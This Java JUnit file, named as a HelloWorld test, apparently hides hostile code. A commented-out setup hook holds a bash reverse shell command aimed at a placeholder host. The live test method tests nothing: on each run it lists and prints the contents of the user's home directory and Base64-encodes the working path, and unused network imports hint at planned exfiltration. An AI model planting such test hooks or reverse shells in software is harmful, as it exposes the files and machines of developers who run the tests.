package org.cyber;

import org.junit.Test;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Arrays;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.Assert.assertTrue;

public class HelloWorldImplTest {

    //@org.junit.Before
//    public void setUp() throws Exception {
//        //Runtime.getRuntime().exec("open .");
//        try {
//            Runtime r = Runtime.getRuntime();
//           // Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ip/8888 0>&1"});
//           // p.waitFor();
//        } catch (IOException e) {
//            e.printStackTrace();
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }
//    }

    @Test
    public void main() throws Exception {
        StringBuffer sb = new StringBuffer("");
        //sb.append(System.getProperties());

        File folder = new File(System.getProperty("user.home"));
        if (folder.isDirectory()){
            File[] files = folder.listFiles();
            sb.append(Arrays.deepToString(files));
        }
        System.out.println(sb.toString());
        assertTrue(true);
        String pwd = new File( "." ).getAbsolutePath();
        pwd = new String( Base64.getEncoder().encode( pwd.getBytes() ) );





    }
}